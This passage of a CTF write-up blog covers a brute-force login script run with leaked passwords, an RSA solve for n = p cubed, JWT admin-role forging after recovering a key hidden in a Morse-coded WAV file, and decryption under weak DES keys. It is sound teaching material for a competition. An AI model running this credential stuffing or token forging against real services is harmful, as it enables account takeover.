    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://h22-ctf-kr2i71j106.dummydomain.team",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": "https://h22-ctf-kr2i71j106.dummydomain.team/login",
    "Cookie": "AWSALB=O+/5TF41uJ/Z2udNP3tuRE9vqS1LMWrdo7IHNknQm66GDKxC/62whUmMk0Ic6zgHwQM4ILOJh8jX735qO2/GlidDJPOiFWZecbV6OKJiaqCFOVcU2NrGbaorpfkw; AWSALBCORS=O+/5TF41uJ/Z2udNP3tuRE9vqS1LMWrdo7IHNknQm66GDKxC/62whUmMk0Ic6zgHwQM4ILOJh8jX735qO2/GlidDJPOiFWZecbV6OKJiaqCFOVcU2NrGbaorpfkw; session=2e4dcc10-f626-4610-8fbb-688a73b1c0dc",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}


data = {"username": "abc", "password": "xyz"}
unames = [
    "uname1",
    "uname2",
]

for u in tqdm(unames):
    data["username"] = u
    for p in tqdm(leaked_creds):
        data["password"] = p
        resp = requests.post(URL, data=data, headers=headers)
        if (not "Try again! Validation failed" in resp.text) or resp.status_code != 200:
            print(str(resp))
            print(resp.text)
            print(resp.status_code)
            print(data)


```
</details>

Another way to reduce the hit space is to select only specific strings from the list which seem to be something apt for an username. It is again just a guess and to reduce the search space and does not guarantee that your hunch will be right.  
Sometimes instincts guide you through the challenges.  

Finally the specific username turned out to be **`img3niu$`** and the password was **`1qaz2wsx`**. The required flag was presented to us in the response as **`ZCTF2022{Th@l@_Fir$tu_Murd3ruu!}`**.  


## Phi_pHi_phI 🗝️
Crypto
{: .label .label-green .fs-1 .ml-0}

This was another crypto challenge which taught me something new. A way to retrieve **`q`** when we have a power relation between **`n`** and **`p`**.  

Challenge instructions:
> I guess its your time to read about Euler!  
>  
> e = 65537  
>  
> n = p * p * p  
>   
> n : 3562025819806207598506935313652818193694408042402095598802948686528664083678156384230585773124187183429452585030988291069096861045972802467416705279604486020388348472580039018962102511983815563723736180708592666974070248322487939238066038544561114394540155530196442120193861812059143546059739735993817021471143725463613639854298689669634150519751023855301637470895032889730491285338846223286091340318508234930986767814601908084003047148599368592010225076235162432043729667295956167726201883189770503279423400834031830491870093870945555857891309998991278667596320334592033112643296049774919487899146919910749049834644331028551624705715438675435164416620434563284111656424624712177288864754414901725391190092902892108380047239415400890400559518249019212241727294623039855933386203050979539735397543730716931588006439242049229731756422034401993258321147410260141018769437607642503118317734393909743006658024818441308680901690851  
>  
> c : 2516237289957302236251858951236032334412455686079400830237839879057787830645067797137738711946341623754456707739577736998819870066617039293316946810320002494648998047302595262757894785321199162980834939799733484596346949505667306716615729921686545529506926252081731428379036200058577976750566384720188753121155352487735871971794519474753366064386647352205889074325185936384137093744271927073455851200678793655763537920521513060575064161635032634628568781522682366980586698537408761318862442844989178839047838089642767260740411619182266928418337833476140122341586702677795684912931299939387873896532856751087425861831230124634177750987351977954576237976705029614761853142929279978559177029765854431818473718241401428942221951239493528042182409411857156609549783747819232585970451980001536203841031474836522076528740926993248600364447915316359289538243994381859589498460396744920733533442314466040542770347133757607703908152916  
> 

I did beat around it for sometime trying out different things, but nothing did work out. Finally I decided to look into **`Euler totient`** function **`ϕ`**. One of the goto websites for Math related stuff is [brilliant.org][9] and their [article][10] on **`Euler's totient`** function is really great.  

From the same we get to know that **ϕ(p<sup>e</sup>) = p<sup>e</sup> - p<sup>e-1</sup>**. Also the challenge instructions give us the clue that **n = p<sup>3</sup>**.  
From prior knowledge on RSA we know that **ϕ(n)** is also equal to **(p-1) * (q-1)**.

Now from the above we solve the below equation to get the value of the second factor **`q`**.  
>    ϕ(n) = ϕ(p<sup>3</sup>) = (p-1) * (q-1)  
> => p<sup>3</sup> - p<sup>2</sup> = (p-1) * (q-1)  
> => n - p<sup>2</sup> = (p-1) * (q-1)  
> => q = 1 + ((n - p<sup>2</sup>) / (p-1))  
> 

From the given data in the challenge instructions we have all the required details to get **`q`**. We use this value to decrypt the given ciphertext **`c`**.  

The above explanation is scripted as a **`python`** code in the below script.  

<details markdown="block">
  <summary>
  Click here to view solve.py  
  </summary>  

```python
from Crypto.Util.number import long_to_bytes
from sympy import cbrt

e = 65537

n = 3562025819806207598506935313652818193694408042402095598802948686528664083678156384230585773124187183429452585030988291069096861045972802467416705279604486020388348472580039018962102511983815563723736180708592666974070248322487939238066038544561114394540155530196442120193861812059143546059739735993817021471143725463613639854298689669634150519751023855301637470895032889730491285338846223286091340318508234930986767814601908084003047148599368592010225076235162432043729667295956167726201883189770503279423400834031830491870093870945555857891309998991278667596320334592033112643296049774919487899146919910749049834644331028551624705715438675435164416620434563284111656424624712177288864754414901725391190092902892108380047239415400890400559518249019212241727294623039855933386203050979539735397543730716931588006439242049229731756422034401993258321147410260141018769437607642503118317734393909743006658024818441308680901690851

c = 2516237289957302236251858951236032334412455686079400830237839879057787830645067797137738711946341623754456707739577736998819870066617039293316946810320002494648998047302595262757894785321199162980834939799733484596346949505667306716615729921686545529506926252081731428379036200058577976750566384720188753121155352487735871971794519474753366064386647352205889074325185936384137093744271927073455851200678793655763537920521513060575064161635032634628568781522682366980586698537408761318862442844989178839047838089642767260740411619182266928418337833476140122341586702677795684912931299939387873896532856751087425861831230124634177750987351977954576237976705029614761853142929279978559177029765854431818473718241401428942221951239493528042182409411857156609549783747819232585970451980001536203841031474836522076528740926993248600364447915316359289538243994381859589498460396744920733533442314466040542770347133757607703908152916

p = int(cbrt(n))

# phi(n) = phi(p^3) = p^3 - p^2 = n - p^2
# also phi(n) = (p-1)*(q-1)
# solve for q using the above two to get the below
q = 1 + ((n - (p * p)) // (p - 1))


def modinv(x, m):
    return pow(x, -1, m)

t = (p - 1) * (q - 1)

print(long_to_bytes(pow(c, modinv(e, t), n)))
```
</details>  

The required flag **`ZCTF2022{s0_s0_s0_y0u_kn0w_h0w_pHi_w0rks}`** is obtained by running the above script.  


## JWT Token 🪙
Web
{: .label .label-green .fs-1 .ml-0}


This was an interesting Web based challenge. It required quite a bit of going around but was really a good one. However it was obvious from the name that it was related to JWT token forging.  

So by prior knowledge it was clear that we had to be able to get the secret key used to sign the JWT token so that we can forge the JWT token to contain the **`admin`** role instead of the **`user`** role.  

This means the main goal is to first find a secret key for JWT signature generation.  

Challenge instructions:
> Admin tries to log in with default admin credentials.  
> Unfortunately, it only has a User role instead of an Admin role.  
> Try to access with the Admin role and bite the sweet.  
>  
> **Challenge link:** https://h22-ctf-63hgkw9bzy.dummydomain.team/  
> **Hint 1:** Surfers love wave !  
> **Hint 2:** DecodeROT7(value) == "Signing key"  
>   

The link lead to a login page. In general for web based challenges source code check is the first step. Checking the source code gave us the first clue which was a comment in the HTML code containing the Base64 encoded username as seen below.
```html
<!-- 
			username -> YWRtaW4=
	
	 -->
```

Base64 decoding the value gives us the username as **`admin`**. Also as we are not informed about the password but the default is to try the username itself as the password. This logs into the webpage. However as stated in the instructions it does not load the flag.  

After logging into the webpage with default credentials we get a dummy page. However there are two clues hidden in this stage. One is the HTML source has a comment stating that we need to login with an **`admin`** role which means the authentication role still is **`user`** privileges and not **`admin`**. On inspecting the cookies it shows us that JWT is being used which is also obvious from the challenge name and instructions.  

Another crucial clue is the **`console.log("/secret.txt")`** in the source code. This points to a hidden url. On accessing this url we get a file download named **`secret.txt`** which can be downloaded [here][11].  

As said before whenever I download a new file I follow the process of throwing **`file`** and **`binwalk`** commands to it. However to my surprise none of these commands gave any output.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ file secret.txt 
secret.txt: data
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ binwalk secret.txt 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$
```  

So the next step is to try **`strings`** with the file to see if we get any hits for our flag.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ strings secret.txt | grep -i "zctf"
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ 
```  
This command also did not return any valid results.  

The next step is to manually analyze the file. On opening the file forcefully in a text editor clearly revealed that it was some binary format. So we had to take the hexdump and analyze. As the magic number of the file is generally present in the first 16 - 32 bytes, we analyze the initial bytes first.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ hexdump -C secret.txt | head -n 10
00000000  49 46 46 14 80 03 00 57  41 56 45 66 6d 74 20 10  |IFF....WAVEfmt .|
00000010  00 00 00 01 00 01 00 40  1f 00 00 40 1f 00 00 01  |.......@...@....|
00000020  00 08 00 64 61 74 61 f0  7f 03 00 80 83 91 ab cb  |...data.........|
00000030  e3 ec df bd 8d 58 2b 0c  04 14 37 69 9e ce f0 fc  |.....X+...7i....|
00000040  f2 d3 a5 70 3e 18 05 09  23 4e 82 b6 e0 f8 fa e6  |...p>...#N......|
00000050  bf 8d 58 2a 0d 04 12 35  65 9a ca ed fc f4 d7 a9  |..X*...5e.......|
00000060  74 42 1a 06 08 20 49 7d  b1 dc f7 fb e9 c3 92 5d  |tB... I}.......]|
00000070  2e 0e 04 10 31 60 95 c6  eb fc f6 da ae 79 46 1d  |....1`.......yF.|
00000080  07 07 1d 45 78 ad d9 f5  fc eb c8 96 61 32 11 04  |...Ex.......a2..|
00000090  0e 2d 5b 90 c2 e8 fb f7  dd b2 7e 4a 20 08 06 1a  |.-[.......~J ...|
```  

Now this has some interesting data. The first few bytes of the file clearly gives us that the file is in some [WAVE][12] format and this is corroborated by the first clue given in the challenge instructions. The format specification of the [WAVE][12] format clearly states that it should start with **`RIFF`** whereas our file is missing one byte **`R`**.  

So we go ahead and prefix the missing byte and voila the file is now in a proper wave format. The corrected wave file can be downloaded [here][13] and was created by using the below command:
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ printf R | cat - secret.txt > corrected_secret.wave
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/jwt]
└─$ file corrected_secret.wave
corrected_secret.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 8 bit, mono 8000 Hz
```

Now we play this audio in some media player online or on-device. I used the online spectrogram generator available [here][14] thinking that the spectrogram of the audio would have some encoded information.  
But as soon as the website started playing it, I could recognize it as a wave with distinct, beeps, long beeps and lows starkly similar to any morse code. So I quickly switched to a morse code decoder available [here][15].  

Running the **`corrected_secret.wav`** file through the morse code decoder gave me a hex encoded string with the hex value being **`5164415F41307233755F4B40756E6C79`**. Using a hex to string converter gives us the string **`QdA_A0r3u_K@unly`**.  

At this stage I was actually stuck because the second hint was not released by then. I was stuck because I thought the above is the secret used for JWT signature verification.  

After the second hint it was clear we had to apply some rotational cipher to obtain the actual key. We use [GCHQ Tools][2] to run the ROT cipher sequentially from **ROT16** onwards and incrementing the rotation amount by one each time. At **ROT19** as seen [here][16] we get a visibly familiar string **`JwT_T0k3n_D@nger`**.  

I stopped at this point and got back to the JWT forging part as we now have the secret key. So now we login, intercept the request with Burp tool and forge the session token to such that it's role claim is changed to **`admin`**. This whole process is captured in the below image.

![Token forging][17]  

By this we successfully reach the flag page and are presented with the required flag as **`ZCTF{I_L0ve_Jwt_T0k3n}`**.  


## Really_W3ak 🔐
Crypto
{: .label .label-green .fs-1 .ml-0}

This was the last challenge in the crypto category which I had pending. The challenge name and the weightage clearly pointed out it was something that is trivial and depends on specific vulnerability in the DES protocol.  

Challenge instructions:
> "a weak will win even at the cost of their life"  
>  
> ~ Might Guy  
>  
> +-+-+ +-+-+-+-+-+ +-+-+-+-+ +-+-+-+  
> |I|m| |k|i|n|d|a| |W|e|a|k| |D|E|S|  
> +-+-+ +-+-+-+-+-+ +-+-+-+-+ +-+-+-+  
> **Encrypted:** F3Z/BVjrDsXJIgpNjNUNnodhk6Pr/1J7svjkmoy4tLI=  
> 

The challenge instructions pointed towards a very weak DES encryption. The content was Base64 encoded and decoding it gave us only binary text which meant it was the encrypted blob as pointed at by the challenge instructions.  

I understood the actual challenge is some brute force key or some specific weakness in DES keys. On searching for **`weak DES encryption`** (in our good old friend Google's younger cousin DuckDuckGo 😜) I landed on this [writeup][19] which contained [this][18] resource explaining the vulnerability.  

The writeup did contain a nice script and modifying our input in the script gave us the required flag. The script, output and flag is available below.  

<details markdown="block">
  <summary>
  Click here to view the script and output
  </summary>

```python
#https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html
from Crypto.Cipher import DES
from base64 import *

f = open('output.txt', 'rb')
ciphertext = b64decode(f.read())
f.close()

KEY=b'\x00\x00\x00\x00\x00\x00\x00\x00'
a = DES.new(KEY, DES.MODE_ECB)
plaintext = a.decrypt(ciphertext)
print (plaintext)

KEY=b'\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F'
a = DES.new(KEY, DES.MODE_ECB)
plaintext = a.decrypt(ciphertext)
print (plaintext)

KEY=b"\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0"
a = DES.new(KEY, DES.MODE_ECB)
plaintext = a.decrypt(ciphertext)
print (plaintext)

KEY=b"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
a = DES.new(KEY, DES.MODE_ECB)
plaintext = a.decrypt(ciphertext)
print (plaintext)
```  

> **Note:** Before running the code store the encrypted Base64 encoded content in the same folder as the script with the file name as **`output.txt`**.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/hacktober22/really_weak]
└─$ python solve.py 
b'ZCTF2022{W3ak_k3ys_3v3ryWh3r3}**'
b"\x0eF\x0b\x82>L\xa61e\xa8l\x8bq\xc4CG%\n\xf6\xffl$\x0b'\x1c\xc6\x1a\x9de?\x0f\x03"
b'\xab\xa0(\x8f\xf8 =V\xab\xe6\x93>\x87\xb5\xb5\x06y\x1e\xa4\xe2\xe1\xb4\x13\x8e\x9d\x9d\x97WE\xcfk7'
b'(\xea\\q[`\xb1\x11\xdfK\t\x7f\x9d\x99r@\xcc_\xdd\xd4\xfcK\xcbD0\xffu\xc1\x8fZ)\x95'
```  
</details>

As obvious from the run of the above script the required flag is **`ZCTF2022{W3ak_k3ys_3v3ryWh3r3}`**.  





[1]: https://mega.nz/file/d9oWFQgD#iA13Jhv-q8boF_B1KnV6MfVAV3wYKZF3jmwv6_SsxgQ
[2]: https://gchq.github.io/CyberChef/
[3]: https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Blowfish_Decrypt(%7B'option':'UTF8','string':'zctf2022'%7D,%7B'option':'UTF8','string':'zctf2022'%7D,'ECB','Raw','Raw')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=c3lkMkJucEZQWjVER2Fab1dNVGRzUVJldlU4Qk54NGlvU2VVTEh3c3JyMnltM0FNbWRjNXFRUmRTKzhpMnFEb3JITXFwR1NLMG1md3lNTG5CNWwzd1E9
[4]: ../assets/images/bWFwX21hcF9xcl9jb2Rl.png
[5]: https://mega.nz/file/5lQjFDYY#l2KnRqK4P7PbxMULGk3fH-zI919AsXWUm_bEliGXA98
[6]: https://mega.nz/file/ItxhDTBI#YOSo7fnTHPx7lIumEvQlIwT8p5l-HOZmWijmqMWEIEc
[7]: http://www.javadecompilers.com/
[8]: https://portswigger.net/burp/documentation/desktop/tools/intruder
[9]: https://brilliant.org/
[10]: https://brilliant.org/wiki/eulers-totient-function/
[11]: https://mega.nz/file/Ag4nEbzR#-RT_YDvsjQ_1FyGCfB9n8sN5i2NogHHhUeJ6Ak5uZ1Y
[12]: https://docs.fileformat.com/audio/wav/
[13]: https://mega.nz/file/Bp4HDSSD#CQbKMkMeErB6VX4moUmU_d_H1NfCyR4xNaR73EjF0KQ
[14]: https://spectrogram.birdiememory.com/
[15]: https://morsecode.world/international/decoder/audio-decoder-adaptive.html
[16]: https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,19)&input=UWRBX0EwcjN1X0tAdW5seQ
[17]: ../assets/images/and0X3NvbHZl.gif
[18]: https://crypto.stackexchange.com/questions/7938/may-the-problem-with-des-using-ofb-mode-be-generalized-for-all-feistel-ciphers
[19]: https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html